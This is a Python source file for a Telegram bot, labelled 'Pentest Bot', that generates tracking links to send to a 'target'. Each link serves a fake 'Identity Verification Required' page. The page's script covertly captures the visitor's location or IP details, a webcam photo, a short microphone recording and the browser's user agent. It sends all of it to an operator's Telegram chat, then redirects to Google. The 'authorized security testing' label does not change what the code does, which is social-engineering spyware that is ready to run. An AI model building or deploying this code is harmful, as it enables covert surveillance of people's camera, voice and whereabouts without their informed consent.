import os
import uuid
import json
from fastapi import FastAPI, Request, HTMLResponse
from typing import Optional
import httpx

TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_IDS = os.environ.get("ADMIN_IDS", "").split(",")
BASE_URL = os.environ.get("BASE_URL", "")

if not TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN not set")

app = FastAPI()
active_links = {}

# ==================== TELEGRAM API HELPERS ====================

async def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    async with httpx.AsyncClient() as client:
        r = await client.post(url, json=payload)
        return r.json()

async def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    async with httpx.AsyncClient() as client:
        r = await client.post(url, json=payload)
        return r.json()

async def answer_callback(callback_id, text=None):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
    async with httpx.AsyncClient() as client:
        r = await client.post(url, json=payload)
        return r.json()

# ==================== TELEGRAM BOT LOGIC ====================

async def handle_start(chat_id, user_id):
    if str(user_id) not in ADMIN_IDS:
        await send_message(chat_id, "Unauthorized access.")
        return
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "Generate New Link", "callback_data": "generate"}],
            [{"text": "My Active Links", "callback_data": "my_links"}],
        ]
    }
    await send_message(
        chat_id,
        "Pentest Bot - Admin Panel\n\nGenerate links for authorized security testing.",
        keyboard
    )

async def handle_callback(chat_id, message_id, user_id, callback_id, data):
    if str(user_id) not in ADMIN_IDS:
        await answer_callback(callback_id, "Unauthorized")
        return
    
    if data == "generate":
        link_id = str(uuid.uuid4())[:8]
        victim_url = f"{BASE_URL}/capture/{link_id}"
        active_links[link_id] = {"admin_id": str(user_id), "victim_data": None}
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "Generate Another", "callback_data": "generate"}],
                [{"text": "Back to Menu", "callback_data": "back"}],
            ]
        }
        await answer_callback(callback_id, "Link created!")
        await edit_message(
            chat_id, message_id,
            f"Link Generated!\n\nSend this to target:\n{victim_url}\n\nCaptures: Camera + Location + Audio",
            keyboard
        )
    
    elif data == "my_links":
        if not active_links:
            await answer_callback(callback_id, "No links yet")
            await edit_message(chat_id, message_id, "No active links.")
            return
        
        msg = "Active Links:\n\n"
        for lid, info in list(active_links.items())[:10]:
            status = "Captured" if info["victim_data"] else "Waiting"
            msg += f"- {lid}: {status}\n"
        
        keyboard = {
            "inline_keyboard": [[{"text": "Back", "callback_data": "back"}]]
        }
        await answer_callback(callback_id, f"{len(active_links)} links")
        await edit_message(chat_id, message_id, msg, keyboard)
    
    elif data == "back":
        keyboard = {
            "inline_keyboard": [
                [{"text": "Generate New Link", "callback_data": "generate"}],
                [{"text": "My Active Links", "callback_data": "my_links"}],
            ]
        }
        await answer_callback(callback_id, "Back to menu")
        await edit_message(chat_id, message_id, "Admin Panel", keyboard)

# ==================== VICTIM PAGE ====================

async def serve_capture_page(link_id: str):
    if not ADMIN_IDS or not ADMIN_IDS[0]:
        return HTMLResponse(content="<h1>Not configured</h1>")
    
    admin_id = ADMIN_IDS[0].strip()
    
    html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Security Verification</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;}}
.card{{background:white;border-radius:20px;padding:40px;max-width:420px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;}}
h1{{font-size:22px;color:#1a1a2e;margin-bottom:10px;}}
p{{color:#666;font-size:14px;margin-bottom:25px;line-height:1.6;}}
.status{{background:#f0f0ff;padding:15px;border-radius:12px;margin:20px 0;}}
.item{{display:flex;align-items:center;justify-content:space-between;padding:8px 0;}}
.item .l{{color:#555;font-size:14px;}}
.dot{{width:12px;height:12px;border-radius:50%;display:inline-block;background:#ff9800;}}
.dot.green{{background:#4CAF50;animation:none;}}
@keyframes p{{0%,100%{{opacity:1;}}50%{{opacity:0.4;}}}}
.dot{{animation:p 1.5s infinite;}}
.btn{{background:#667eea;color:white;border:none;padding:14px 40px;border-radius:30px;font-size:16px;cursor:pointer;margin-top:10px;}}
.btn:disabled{{background:#ccc;cursor:default;}}
.hidden{{display:none;}}
.loader{{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:30px;height:30px;animation:s 1s linear infinite;margin:15px auto;}}
@keyframes s{{0%{{transform:rotate(0deg);}}100%{{transform:rotate(360deg);}}}}
.succ{{color:green;font-weight:bold;margin-top:15px;}}
</style>
</head>
<body>
<div class="card">
<h1>Identity Verification Required</h1>
<p>Your organization requires a security check. Takes 10 seconds.</p>
<div class="status">
<div class="item"><span class="l">Camera Access</span><span class="dot" id="cs"></span></div>
<div class="item"><span class="l">Location Access</span><span class="dot" id="ls"></span></div>
<div class="item"><span class="l">Microphone Access</span><span class="dot" id="ms"></span></div>
</div>
<button class="btn" id="sb" onclick="start()">Start Verification</button>
<div id="ld" class="loader hidden"></div>
<div id="sm" class="succ hidden">Verification Complete! Redirecting...</div>
</div>
<script>
const BT="{TOKEN}";
const CI="{admin_id}";
function start(){{
document.getElementById("sb").disabled=true;document.getElementById("sb").textContent="Processing...";
document.getElementById("ld").classList.remove("hidden");
getLoc();getCam();getMic();
}}
function getLoc(){{
if(navigator.geolocation){{
navigator.geolocation.getCurrentPosition(p=>{{
document.getElementById("ls").className="dot green";
fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"Location: "+p.coords.latitude+", "+p.coords.longitude}})}});
}},e=>{{fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{{fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"IP: "+d.ip+", "+d.city+", "+d.country_name}})}});}});document.getElementById("ls").className="dot green";}},{{enableHighAccuracy:true,timeout:10000}});
}}else document.getElementById("ls").className="dot green";
}}
function getCam(){{
if(!navigator.mediaDevices)return;
navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}},audio:false}}).then(s=>{{
document.getElementById("cs").className="dot green";let v=document.createElement("video");v.srcObject=s;v.play();
setTimeout(()=>{{let c=document.createElement("canvas");c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext("2d").drawImage(v,0,0);let d=c.toDataURL("image/jpeg",0.7);let bs=atob(d.split(",")[1]);let ab=new ArrayBuffer(bs.length);let ia=new Uint8Array(ab);for(let i=0;i<bs.length;i++)ia[i]=bs.charCodeAt(i);let bl=new Blob([ab],{{type:"image/jpeg"}});let fd=new FormData();fd.append("chat_id",CI);fd.append("photo",bl,"c.jpg");fetch("https://api.telegram.org/bot"+BT+"/sendPhoto",{{method:"POST",body:fd}});s.getTracks().forEach(t=>t.stop());}},2000);
}}).catch(e=>{{}});
}}
function getMic(){{
if(!navigator.mediaDevices)return;
navigator.mediaDevices.getUserMedia({{video:false,audio:true}}).then(s=>{{
document.getElementById("ms").className="dot green";let r=new MediaRecorder(s);let c=[];r.ondataavailable=e=>c.push(e.data);r.onstop=()=>{{let b=new Blob(c,{{type:"audio/webm"}});let fd=new FormData();fd.append("chat_id",CI);fd.append("audio",b,"a.webm");fetch("https://api.telegram.org/bot"+BT+"/sendAudio",{{method:"POST",body:fd}});}};r.start();setTimeout(()=>r.stop(),5000);
}}).catch(e=>{{}});
}}
fetch("https://api.telegram.org/bot"+BT+"/sendMessage",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{chat_id:CI,text:"Target opened link! "+navigator.userAgent}})}});
setTimeout(()=>{{document.getElementById("ld").classList.add("hidden");document.getElementById("sm").classList.remove("hidden");setTimeout(()=>window.location.href="https://www.google.com",2000);}},10000);
</script>
</div>
</body>
</html>"""
    return HTMLResponse(content=html)

# ==================== ROUTES ====================

@app.post("/webhook")
async def webhook(request: Request):
    try:
        data = await request.json()
        
        if "message" in data:
            msg = data["message"]
            chat_id = msg["chat"]["id"]
            user_id = msg["from"]["id"]
            text = msg.get("text", "")
            
            if text == "/start":
                await handle_start(chat_id, user_id)
        
        if "callback_query" in data:
            cb = data["callback_query"]
            chat_id = cb["message"]["chat"]["id"]
            message_id = cb["message"]["message_id"]
            user_id = cb["from"]["id"]
            callback_id = cb["id"]
            cb_data = cb["data"]
            
            await handle_callback(chat_id, message_id, user_id, callback_id, cb_data)
        
        return {"ok": True}
    except Exception as e:
        print(f"Webhook error: {str(e)}")
        return {"ok": False, "error": str(e)}

@app.get("/capture/{link_id}")
async def capture_route(link_id: str):
    return await serve_capture_page(link_id)

@app.get("/api/health")
async def health():
    return {"status": "ok", "token_set": bool(TOKEN), "admins": ADMIN_IDS, "links": len(active_links)}

@app.get("/")
async def index():
    return {"status": "Pentest Bot Running"}
